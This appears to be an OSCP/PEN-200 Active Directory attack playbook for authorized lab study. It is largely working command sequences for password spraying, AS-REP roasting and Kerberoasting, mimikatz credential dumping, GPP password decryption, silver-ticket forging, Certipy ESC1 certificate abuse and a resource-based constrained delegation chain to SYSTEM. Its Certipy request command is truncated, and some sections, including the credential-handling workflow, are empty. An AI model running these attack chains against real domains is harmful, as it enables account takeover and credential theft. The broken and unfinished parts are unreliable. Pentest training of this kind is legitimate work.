Active Directory — OSCP / PEN-200 Master Methodology#

ABSTRACTHow to Use This Note

This is a trigger-driven playbook. You are never guessing "what's next". You observe a fact (a username, a password, an open port, a hash, an ACL), you find that fact in the #Trigger Index or #Trigger-Based Decision Workflow, and it routes you to the exact technique in the #Technique Pattern Bank.

Every command is sourced from the uploaded PEN-200 PDF. Anything not in the PDF is explicitly flagged so you never bring a non-exam tool into the exam by accident.

Companion notes: Windows-PrivEsc-OSCP-Methodology · Linux-PrivEsc-OSCP-Methodology — local privilege escalation once you have a foothold on a host.

WARNINGScope & Authorization

Assume this is for an authorized OSCP/PEN-200 lab environment only. Do not run any of this against systems you do not own or are not explicitly authorized to test.

INFOSource Rules Applied in This Note
  • The uploaded OSCP/PEN-200 PDF is the primary source.
  • No attack paths are invented that are not supported by the PDF.
  • Anything the PDF does not contain is marked: > [!warning] Not Found in Uploaded PDF.
  • Useful-but-absent tools are marked: > [!info] Additional OSCP Context.

Active Directory Master Checklist#

TIPTrigger

Use this phased checklist as your top-level loop. Each phase tells you the search keywords to scan output for, the trigger words that mean "act now", the commands to run, what to look for, what it means, and the next action.

Phase 0 — External Foothold (Pre-AD)#

INFOSearch Keywords

nmap · open ports · 88 389 445 135 5985 3389 · domain controller · web app · service banner

  • Scan the target / subnet for live hosts and AD-indicative ports.
  • Identify the Domain Controller (Kerberos 88 + LDAP 389 + DNS 53 on one host = DC).
  • Identify member servers (SMB 445, WinRM 5985, RDP 3389).
EXAMPLECommand
BASH
nmap -p 88,135,139,389,445,464,593,636,3268,3269,5985,3389 -sV <DC_IP>
SUCCESSWhat Good Output Looks Like

Ports 88/kerberos, 389/ldap, 445/microsoft-ds, 3268/globalcatLDAP open → this is a Domain Controller.

WARNINGWhat This Means

You now know where the domain "brain" is. The DC is the target you ultimately need Domain Admin / DCSync rights against.

NEXT ACTIONNext Action

Get any valid domain credential (web app, default creds, password reuse), then jump to Phase 1. With no creds yet, see #Workflow A — You Have NO Credentials.

Phase 1 — Authenticated Domain Enumeration#

INFOSearch Keywords

net user /domain · Get-NetUser · Get-NetGroup · samAccountName · Domain Admins · description fields · SPN · lastlogon · pwdlastset

  • Enumerate domain users (net user /domain, PowerView, .NET LDAP).
  • Enumerate domain groups and membership (especially Domain Admins, Enterprise Admins).
  • Enumerate computers in the domain.
  • Read user description fields (passwords are often parked there).
  • Find logged-on users / sessions to map where admins are.
  • Find accounts with SPNs (Kerberoast targets) and DONT_REQ_PREAUTH (AS-REP targets).
  • Pull the account lockout policy before any spraying.
EXAMPLECommand
CMD
net user /domain
net user <USERNAME> /domain
net group "Domain Admins" /domain
net accounts
POWERSHELL
# PowerView
Get-NetUser | select cn,description,pwdlastset,lastlogon
Get-NetGroup "Domain Admins"
Get-NetComputer
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired
SUCCESSWhat Good Output Looks Like

A user list, group memberships, and any description containing what looks like a password (e.g. a SYSVOL/onboarding note).

WARNINGWhat This Means

You now have an attack surface: usernames to spray, SPN accounts to Kerberoast, no-preauth accounts to AS-REP roast, and possibly a plaintext password in a description.

NEXT ACTIONNext Action

Branch on what you found: SPN → #Technique — Kerberoasting; no-preauth → #Technique — AS-REP Roasting; description password → #Credential Handling Workflow; nothing yet → #Technique — Password Spraying.

CHECKDecision Logic

Enumerate before you attack. Lockout policy first, spray second. A hash you can roast offline beats a spray that locks accounts.

Phase 2 — Credential Acquisition#

INFOSearch Keywords

hashcat · -m 18200 · -m 13100 · -m 1000 · Pwn3d! · cracked · GPP cpassword · cpassword= · sekurlsa::logonpasswords

  • AS-REP roast all no-preauth users → crack -m 18200.
  • Kerberoast all SPN users → crack -m 13100.
  • Password-spray known users with any candidate password.
  • Hunt SMB shares (esp. SYSVOL) for GPP cpassword and config/script secrets.
  • On any host you control, dump cached creds with mimikatz.
NEXT ACTIONNext Action

Every credential you get → run it through #Credential Handling Workflow to validate scope (where does it log in? is it local admin anywhere?).

Phase 3 — Lateral Movement#

INFOSearch Keywords

Pwn3d! · Find-LocalAdminAccess · WinRM · 5985 · PsExec · wmiexec · pass the hash · overpass the hash · pass the ticket

  • Find where your creds are local admin (Find-LocalAdminAccess, CME Pwn3d!).
  • Move to that host: WinRM / PsExec / WMI / PtH.
  • On the new host, dump creds again → repeat the loop toward a Domain Admin.
NEXT ACTIONNext Action

See #Workflow R — You Need to Move Laterally and #Technique — Pass the Hash / #Technique — Overpass the Hash / #Technique — Pass the Ticket.

Phase 4 — Domain Privilege Escalation & Persistence#

INFOSearch Keywords

Domain Admins · DCSync · secretsdump · krbtgt · golden ticket · ntds.dit · GenericAll · WriteDACL

  • Confirm a path to Domain Admin (BloodHound shortest path, ACL abuse).
  • As a privileged user, DCSync the krbtgt / target hashes.
  • (Persistence, lab only) Golden Ticket / NTDS extraction via shadow copy.
NEXT ACTIONNext Action

See #Technique — DCSync, #Technique — Golden Ticket, #Technique — NTDS.dit via Shadow Copy.

CHECKDecision Logic

The exam goal is usually DA / full domain compromise. Once you can DCSync, you own the domain — stop and document, do not over-engineer persistence.

Trigger-Based Decision Workflow#

TIPTrigger

Each workflow below is a branch keyed to your current state. Follow the arrows.

Workflow A — You Have NO Credentials#

CHECKDecision Logic

No creds → you can still enumerate users (no-auth) and attack Kerberos pre-auth.

  1. Identify the DC (#Phase 0 — External Foothold (Pre-AD)).
  2. Enumerate usernames without creds → kerbrute userenum / impacket-GetNPUsers with a <USERLIST>.
  3. AS-REP roast any user lacking pre-auth → #Technique — AS-REP Roasting (no password needed).
  4. Build a <USERLIST> from web app, OSINT, or the no-preauth output.
  5. If you obtain even one password elsewhere → #Workflow C — You Have One Password.
NEXT ACTIONNext Action

If AS-REP roasting yields a crackable hash, crack it (-m 18200) → you now have one user+password → #Credential Handling Workflow.

Workflow B — You Have Usernames Only#

  1. AS-REP roast the whole <USERLIST> → #Technique — AS-REP Roasting.
  2. Check lockout policy (net accounts) → then password spray → #Technique — Password Spraying.
  3. Any hit → #Credential Handling Workflow.

Workflow C — You Have One Password#

CHECKDecision Logic

One password is most valuable sprayed widely — reuse is rampant in AD.

  1. Spray it across all known users (CME / Spray-Passwords) → #Technique — Password Spraying.
  2. Validate each hit's scope (local admin? WinRM? RDP?) → #Credential Handling Workflow.

Workflow D — You Have an NTLM Hash#

  1. Try it directly via Pass-the-Hash (no cracking needed) → #Technique — Pass the Hash.
  2. In parallel, crack it offline (hashcat -m 1000) → #Technique — Cracking Hashes.
  3. If cracked → #Workflow E — You Cracked a Password.

Workflow E — You Cracked a Password#

  1. Validate where it logs in → #Credential Handling Workflow.
  2. Spray it (reuse) across all users/hosts → #Technique — Password Spraying.
  3. Check local-admin (Find-LocalAdminAccess / CME Pwn3d!).
  4. Local admin anywhere → dump creds → #Technique — Dumping Credentials with Mimikatz → loop laterally.

Workflow R — You Need to Move Laterally#

CHECKDecision Logic

Pick the technique by what's open + what you hold:

  • Local admin + WinRM(5985) → #Technique — WinRM PSSession or #Technique — PsExec
  • Only a hash → #Technique — Pass the Hash
  • A TGT/TGS in memory → #Technique — Pass the Ticket / #Technique — Overpass the Hash
  • DCOM (135) only → #Technique — DCOM Lateral Movement

Technique — Domain & Group Enumeration#

INFOSearch Keywords

net user /domain · net group · Get-NetUser · Get-NetGroup · DirectorySearcher · samAccountType · objectClass=group · description

Trigger Words: "valid creds", "what users exist", "who is Domain Admin".

Purpose: Map users, groups, computers, and group memberships so every later attack has a target list.

EXAMPLECommand
CMD
net user /domain
net user jeffadmin /domain
net group /domain
net group "Domain Admins" /domain
net accounts
POWERSHELL
# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser | select cn,samaccountname,description
Get-NetGroup | select cn
Get-NetGroup "Domain Admins"
Get-NetComputer | select name,operatingsystem
POWERSHELL
# Native .NET LDAP (no tools dropped)
$d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$s = New-Object System.DirectoryServices.DirectorySearcher
$s.Filter = "(samAccountType=805306368)"   # all users
$s.FindAll() | % { $_.Properties.samaccountname }
$s.Filter = "(objectClass=group)"
$s.FindAll() | % { $_.Properties.cn }
SUCCESSWhat Good Output Looks Like

Full user/group lists; Domain Admins membership; a description field leaking a credential.

WARNINGWhat This Means

You now have the raw material for spraying, roasting, and ACL analysis — and possibly a free password.

NEXT ACTIONNext Action

SPN users → #Technique — Kerberoasting; no-preauth → #Technique — AS-REP Roasting; description secret → #Credential Handling Workflow.

EXAMPLEFollow-Up Commands
POWERSHELL
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired | select samaccountname
CHECKDecision Logic

Prefer native net.exe / .NET when AV is hot; use PowerView for depth (SPNs, sessions, ACLs).

Technique — Finding Logged-On Users#

INFOSearch Keywords

PsLoggedon · Get-NetSession · NetWkstaUserEnum · session · who is logged in

Trigger Words: "where are the admins", "which box has a DA session".

Purpose: Find which host an admin is logged into so you can target it for credential theft.

EXAMPLECommand
CMD
.\PsLoggedon.exe \\<TARGET_HOST>
POWERSHELL
Get-NetSession -ComputerName <TARGET_HOST>
Find-DomainUserLocation
SUCCESSWhat Good Output Looks Like

A Domain Admin name shown as logged on to a server you can reach.

WARNINGWhat This Means

If you get local admin on that host, you can dump that DA's credentials from memory.

NEXT ACTIONNext Action

Get local admin there → #Technique — Dumping Credentials with Mimikatz.

PsLoggedon relies on the Remote Registry service; if it fails, fall back to Get-NetSession.

Technique — BloodHound Path Discovery#

INFOSearch Keywords

SharpHound · Invoke-BloodHound · CollectionMethod All · neo4j · Shortest Path to Domain Admins · Mark as Owned

Trigger Words: "what's the path to DA", "I'm stuck, who can I abuse".

Purpose: Collect AD objects/ACLs and graph the shortest path from owned principals to Domain Admins.

Technique — Password Spraying#

INFOSearch Keywords

Spray-Passwords · crackmapexec smb · kerbrute passwordspray · --continue-on-success · Pwn3d! · lockout threshold

Trigger Words: "one password, many users", "no creds but a userlist".

Purpose: Test one (or few) password(s) against many accounts to find reuse — without tripping lockout.

WARNINGWhat This Means (read FIRST)

Always check the lockout policy before spraying: net accounts → note Lockout threshold (e.g. 5). Stay below it.

EXAMPLECommand
POWERSHELL
# In-domain, native-ish
.\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
.\Spray-Passwords.ps1 -File <WORDLIST>
BASH
# crackmapexec — also flags local admin with Pwn3d!
crackmapexec smb <DC_IP> -u <USERLIST> -p '<PASSWORD>' --continue-on-success
# kerbrute
kerbrute passwordspray -d <DOMAIN> <USERLIST> '<PASSWORD>'
SUCCESSWhat Good Output Looks Like

[+] corp.com\stephanie:<PASSWORD> and ideally (Pwn3d!) next to a host.

WARNINGWhat This Means

A valid login = foothold. Pwn3d! = local admin on that host = credential-dump opportunity.

NEXT ACTIONNext Action

Valid login → #Credential Handling Workflow. Pwn3d! → #Technique — Dumping Credentials with Mimikatz.

CHECKDecision Logic

Spray one password across all users, wait, repeat — never many passwords against one user (that's a lockout).

Technique — AS-REP Roasting#

INFOSearch Keywords

DONT_REQ_PREAUTH · GetNPUsers · Rubeus asreproast · -m 18200 · no pre-authentication

Trigger Words: "user doesn't require pre-auth", "I have a userlist but no password".

Purpose: Request an AS-REP for accounts with Kerberos pre-auth disabled; the reply is crackable offline with no password.

EXAMPLECommand
BASH
# From Linux, no creds needed (just userlist or known user)
impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/ -usersfile <USERLIST> -format hashcat -outputfile asrep.txt
impacket-GetNPUsers <DOMAIN>/<USERNAME> -dc-ip <DC_IP> -no-pass
POWERSHELL
# From a domain host
.\Rubeus.exe asreproast /nowrap
SUCCESSWhat Good Output Looks Like

A hash beginning $krb5asrep$23$user@DOMAIN....

WARNINGWhat This Means

That account's password can be cracked offline — no lockout risk, no interaction with the account.

NEXT ACTIONNext Action

Crack it → #Technique — Cracking Hashes (-m 18200) → cracked → #Workflow E — You Cracked a Password.

EXAMPLEFollow-Up Commands
BASH
hashcat -m 18200 asrep.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
CHECKDecision Logic

If you have a writable target user (GenericWrite), you can set DONT_REQ_PREAUTH → Targeted AS-REP Roasting. See #Technique — ACL Abuse.

Technique — Kerberoasting#

INFOSearch Keywords

setspn · Get-NetUser -SPN · GetUserSPNs · Rubeus kerberoast · -m 13100 · serviceprincipalname · TGS-REP

Trigger Words: "service account", "user has an SPN", "I have valid creds and want offline cracking".

Purpose: Request a TGS for SPN accounts; the ticket is encrypted with the service account's NTLM hash → crack offline.

EXAMPLECommand
CMD
setspn -L <USERNAME>
BASH
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -outputfile kerb.txt
POWERSHELL
.\Rubeus.exe kerberoast /outfile:kerb.txt
SUCCESSWhat Good Output Looks Like

A hash beginning $krb5tgs$23$*user$DOMAIN$....

WARNINGWhat This Means

Service accounts often have weak, rarely-rotated passwords → high-value crack.

NEXT ACTIONNext Action

Crack → #Technique — Cracking Hashes (-m 13100). Cracked service account → check it for local admin / Silver Ticket.

EXAMPLEFollow-Up Commands
BASH
hashcat -m 13100 kerb.txt <WORDLIST> -r /usr/share/hashcat/rules/best64.rule
CHECKDecision Logic

Requires valid domain creds (unlike AS-REP). If you can write an SPN onto an account you control (GenericWrite) → Targeted Kerberoasting → #Technique — ACL Abuse.

Technique — Cracking Hashes#

INFOSearch Keywords

hashcat · -m 18200 · -m 13100 · -m 1000 · rockyou.txt · best64.rule

Trigger Words: "I have a hash", "AS-REP / TGS / NTLM to crack".

Purpose: Recover plaintext from captured hashes.

EXAMPLECommand
BASH
hashcat -m 18200 asrep.txt <WORDLIST>            # AS-REP
hashcat -m 13100 kerb.txt  <WORDLIST>            # Kerberoast (TGS-REP)
hashcat -m 1000  ntlm.txt  <WORDLIST>            # NTLM
SUCCESSWhat Good Output Looks Like

hash:plaintextpassword in the output / --show.

WARNINGWhat This Means

You now hold a usable plaintext credential.

NEXT ACTIONNext Action

→ #Workflow E — You Cracked a Password (validate, spray, check local admin).

CHECKDecision Logic

Mode mapping is the exam trap: 18200=AS-REP, 13100=Kerberoast, 1000=NTLM. Add -r best64.rule before trying bigger wordlists.

Technique — SMB Share Hunting#

INFOSearch Keywords

Find-DomainShare · SYSVOL · cpassword · Groups.xml · gpp-decrypt · readable · writable

Trigger Words: "open share", "SYSVOL", "GPP", "config files".

Purpose: Find shares and loot them for stored credentials — classically GPP cpassword in SYSVOL.

EXAMPLECommand
POWERSHELL
Find-DomainShare -CheckShareAccess
BASH
# Decrypt a found GPP cpassword
gpp-decrypt "<cpassword-blob>"
SUCCESSWhat Good Output Looks Like

A readable SYSVOL path with Groups.xml containing cpassword="...".

WARNINGWhat This Means

GPP cpassword uses a Microsoft-published AES key → trivially decryptable to a real domain credential.

NEXT ACTIONNext Action

Decrypt → #Credential Handling Workflow. Writable share → consider payload drop for execution.

INFOAdditional OSCP Context

smbclient is in the PDF — it appears in the pass-the-hash section to access an SMB share with an NTLM hash: smbclient \\\\<TARGET_IP>\\<SHARE> -U <USERNAME> --pw-nt-hash <HASH> (Listing 358), then dir / get. So it is course-sanctioned for SMB enumeration and PtH file access. For domain-wide share discovery from a foothold, the PDF's primary method is still PowerView's Find-DomainShare.

WARNINGNot Found in Uploaded PDF

smbmap, enum4linux-ng, and rpcclient were not found in the uploaded PDF. The Kali ldapsearch binary was not found either — but note the PDF defines a custom PowerShell function named LDAPSearch (a course-authored helper, not the Kali CLI tool), so a grep for "ldapsearch" will hit that function, not the binary. This technique or command was not found in the uploaded PDF.

CHECKDecision Logic

Always read SYSVOL first — it's domain-readable by default and is the #1 spot for GPP secrets.

Technique — Silver Ticket#

INFOSearch Keywords

kerberos::golden (silver variant) · /target · /service · /rc4 · service-account NTLM · domain SID · target SPN · PAC · impacket-ticketer

Trigger Words: "I have a service account's NTLM hash/password", "forge a TGS", "access an SPN as admin without its password", "MSSQLSvc / HTTP / CIFS silver ticket".

Purpose: Forge a service ticket (TGS) offline, signed with the service account's own hash, granting yourself any group memberships (e.g. Domain Admins). The service blindly trusts it (PAC is rarely validated) → use that SPN's app as a fake admin. PEN-200 §22.2.4.

INFOThree ingredients you must collect first (§22.2.4)
  1. SPN password hash — the NTLM (or AES) hash of the account that runs the service.
  2. Domain SID — the domain portion of any user's SID (drop the trailing -RID).
  3. Target SPN — service/host you forge for: http/web04.corp.com, MSSQLSvc/sql01.corp.com:1433, MSSQL/host, cifs/host.
EXAMPLEIngredient 1 — service-account NTLM hash (mimikatz)
TEXT
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords     # read the svc account's NTLM (PDF: iis_service NTLM 4d28cf52...)
# alternatives:  lsadump::sam   |   lsadump::dcsync /user:<SVC_ACCOUNT>   (with the rights)
EXAMPLEIngredient 2 — domain SID
TEXT
PS> whoami /user      # corp\jeff  S-1-5-21-1987370270-658905905-1781884369-1105
#                       domain SID = all of it EXCEPT the trailing -1105 (the RID)
# Linux:  impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC_IP>
EXAMPLEForge + inject — Windows / mimikatz (course method, §22.2.4)
TEXT
mimikatz # kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /ptt \
           /target:<SERVICE_HOST_FQDN> /service:<SPN_SERVICE> /rc4:<SVC_NTLM> /user:<IMPERSONATE>
# verbatim PDF example (HTTP SPN on WEB04, impersonating jeffadmin):
# kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt \
#   /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
PS> klist                                  # confirm: Server: http/web04.corp.com ; Client: jeffadmin
PS> iwr -UseDefaultCredentials http://web04 # now 200 OK as jeffadmin
EXAMPLEForge — Linux / impacket-ticketer (PG method — used on Nagoya)
BASH
# same three ingredients → a .ccache you use over Kerberos:
impacket-ticketer -nthash <SVC_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <service/host> <IMPERSONATE>
export KRB5CCNAME=$PWD/<IMPERSONATE>.ccache
# then hit the service with -k (no password):  impacket-mssqlclient -k <SERVICE_HOST_FQDN>

(impacket-ticketer is the real-world/PG equivalent of mimikatz kerberos::golden; the PDF forges with mimikatz.)

WARNINGWhat This Means / caveats

No krbtgt needed (that's a golden ticket) — a silver ticket needs only the service account's hash and forges with no DC contact, but works only for that one SPN/service. PAC patch (enforced Oct 11 2022): with PAC_REQUESTOR you can no longer forge tickets for non-existent users in-domain → impersonate a real account (e.g. Administrator).

NEXT ACTIONNext Action

Use the ticket against the SPN (web app / MSSQL / CIFS). For MSSQL → enable xp_cmdshell → shell as the SQL service account → #PG Walkthrough — Nagoya (MSSQL → Silver Ticket → SeImpersonate → SYSTEM).

CHECKDecision Logic

Have a service account's hash/password (Kerberoast crack, mimikatz, or known creds)? Forge a silver ticket for its SPN impersonating Administrator → use the service as a sysadmin even when that service account isn't privileged inside the app.

PG Technique — ADCS Abuse (Certipy, ESC1)#

INFOSearch Keywords

certipy find · -vulnerable · ESC1 · client-auth EKU · enrollee-supplies-subject · -upn administrator · certipy auth · .pfx

Trigger Words: "AD CS / Certificate Authority present", "certipy find flags ESC1-ESC8", "vulnerable template".

Purpose: Abuse a misconfigured certificate template to mint a logon certificate as Domain Admin, then turn that cert into an NT hash / TGT. Not in the PDF, but the single highest-yield modern AD privesc.

EXAMPLEStep 1 — find vulnerable templates
BASH
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# read the [!] Vulnerabilities block; ESC1 = enrollee supplies SAN + Client Authentication EKU + low-priv enroll
EXAMPLEStep 2 — request a cert impersonating an admin (ESC1)
BASH
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> \

# → saves administrator.pfx
EXAMPLEStep 3 — turn the cert into a hash / TGT
BASH
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# → prints the TGT (.ccache) AND the NT hash for administrator
SUCCESSWhat Good Output Looks Like

[*] Got hash for 'administrator@<domain>': aad3b...:<NT_HASH> and a saved .ccache. Feed the hash to #Technique — Pass the Hash / #Technique — DCSync, or export KRB5CCNAME=administrator.ccache and use the ticket directly.

CHECKDecision Logic

certipy find -vulnerable first. ESC1 is the textbook win; ESC8 (NTLM relay to the CA web-enrollment endpoint, often via PetitPotam/coercion) applies when you can relay instead of enroll. Always try this when port 443/certsrv or the AD CS role is visible.

PG Technique — Resource-Based Constrained Delegation (RBCD)#

INFOSearch Keywords

GenericWrite/GenericAll over a computer · msDS-AllowedToActOnBehalfOfOtherIdentity · impacket-rbcd · impacket-addcomputer · impacket-getST · S4U2Self/S4U2Proxy

Trigger Words: "BloodHound shows write over a computer object", "RBCD edge", "I can add a computer account".

Purpose: Write-access over a computer object → impersonate any user (e.g. Administrator) to that computer → SYSTEM on it.

EXAMPLEFull chain
BASH
# 1) Get a computer account you control (default MachineAccountQuota=10 lets any domain user add one):
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASSWORD>'

# 2) Write the delegation attribute on the target you have rights over:
impacket-rbcd -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASSWORD>'

# 3) Get a service ticket impersonating Administrator to the target:
impacket-getST -spn 'cifs/target.<DOMAIN>' -impersonate Administrator -dc-ip <DC_IP> <DOMAIN>/'EVIL$':'Evil123!'

# 4) Use the ticket:
export KRB5CCNAME=Administrator@cifs_target.<DOMAIN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass target.<DOMAIN>
SUCCESSWhat Good Output Looks Like

getST saves an Administrator@...ccache; psexec -k -no-pass drops a SYSTEM shell on the target without ever knowing Administrator's password.

CHECKDecision Logic

Use when an ACL edge lands on a computer (not a user). If MachineAccountQuota=0, reuse an existing computer account you already control instead of addcomputer.

NEXT ACTIONNext Action

Credential Handling Workflow#

TIPTrigger

Active Recall Questions#

DECISIONDC Identification

Which three open ports, seen together on one host, most strongly indicate a Domain Controller — and why? (Answer: 88/Kerberos + 389/LDAP + 53/DNS; the DC runs the KDC, the directory service, and AD-integrated DNS.)

DECISIONSpray Safety

What is the one command you must run before any password spray, and which value do you read from it? (Answer: net accounts; read the Lockout threshold and stay below it.)

DECISIONRoasting Difference

What is the key prerequisite difference between AS-REP roasting and Kerberoasting? (Answer: AS-REP needs no valid creds — only an account with pre-auth disabled; Kerberoasting requires valid domain credentials to request the TGS.)

DECISIONSilver Ticket Ingredients

What three things do you need to forge a silver ticket, and what does it get you that a golden ticket doesn't require? (Answer: (1) the service account's NTLM/AES hash, (2) the domain SID, (3) the target SPN. Unlike a golden ticket it needs no krbtgt and no DC contact — but only works for that one service. Forge with mimikatz kerberos::golden /target /service /rc4 or impacket-ticketer -spn <svc/host> -nthash -domain-sid.)

DECISIONSilver Ticket → MSSQL (Nagoya)

You have svc_mssql's hash but it isn't a SQL sysadmin. How do you still get xp_cmdshell? (Answer: forge a silver ticket for MSSQL/<host> impersonating Administrator (impacket-ticketer ... ; export KRB5CCNAME), connect impacket-mssqlclient -k <host>, then sp_configure 'xp_cmdshell',1; RECONFIGURE; xp_cmdshell ... runs as svc_mssql → which has SeImpersonatePrivilege → PrintSpoofer → SYSTEM.)

DECISIONHashcat Modes

Match the mode to the hash: -m 18200, -m 13100, -m 1000. (Answer: 18200 = AS-REP, 13100 = Kerberoast/TGS-REP, 1000 = NTLM.)

DECISIONPtH vs Cracking

You have an NTLM hash and the account is local admin on a server. What's faster than cracking, and how? (Answer: Pass-the-Hash — impacket-wmiexec/psexec -hashes :<HASH> ... authenticates with the hash directly.)

DECISIONLocal Admin Loot

Why is finding Pwn3d! / local-admin so valuable in the lateral-movement loop? (Answer: local admin lets you run mimikatz sekurlsa::logonpasswords to harvest more creds/hashes/tickets from that host's LSASS — including any logged-on admin.)

DECISIONGPP cpassword

You found cpassword= in a SYSVOL Groups.xml. Why is this a critical finding and how do you exploit it? (Answer: GPP cpassword is AES-encrypted with a Microsoft-published key; gpp-decrypt recovers the plaintext domain credential instantly.)

DECISIONPath to DA

You have a foothold but no admin. What single tool best tells you the route to Domain Admins, and what do you mark first? (Answer: BloodHound (SharpHound collection); mark your owned principal as Owned, then run Shortest Path to Domain Admins from Owned.)

DECISIONDCSync Prereq

What rights are required to run a DCSync, and what is the highest-value hash to pull? (Answer: Domain/Enterprise Admins or DS-Replication-Get-Changes rights; pull krbtgt to enable a Golden Ticket.)

DECISIONThe Core Loop

State the repeating AD attack loop in one sentence. (Answer: enumerate → obtain a credential or local-admin right → use it to reach a new host → enumerate again → until you can DCSync / reach Domain Admin.)

DECISIONADCS ESC1 (PG / beyond PDF)

certipy find -vulnerable flags a template as ESC1. Why is that domain takeover, and what are the two commands? (Answer: ESC1 lets a low-priv user enroll in a client-auth template while supplying an arbitrary SAN → certipy req ... -upn administrator@domain to mint an admin cert, then certipy auth -pfx administrator.pfx to get the NT hash/TGT → PtH/DCSync.)

BloodHound shows GenericWrite over SRV01$. What's the RBCD path to SYSTEM? (Answer: add/own a computer account → impacket-rbcd -action write to set msDS-AllowedToActOnBehalfOfOtherIdentity on SRV01$ → impacket-getST -spn cifs/srv01 -impersonate Administrator → psexec -k -no-pass.)
